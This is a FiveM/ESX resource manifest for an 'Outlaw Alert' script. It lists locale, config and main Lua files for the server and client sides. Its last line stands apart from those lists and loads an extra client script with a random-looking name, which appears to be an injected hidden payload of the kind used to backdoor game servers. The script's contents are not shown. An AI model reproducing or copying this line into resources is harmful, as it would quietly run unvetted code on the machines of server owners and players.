fx_version 'bodacious'
game 'gta5'

description 'ESX Outlaw Alert'

version '1.1.0'

server_scripts {
	'@mysql_async/lib/MySQL.lua',
	'@essentialmode/locale.lua',
	'locales/fr.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'server/main.lua'
}
client_scripts {
	'@essentialmode/locale.lua',
	'locales/fr.lua',
	'locales/en.lua',
	'locales/es.lua',
	'config.lua',
	'client/main.lua'
}

client_script "DISqkiIEcVydGenWnD.lua"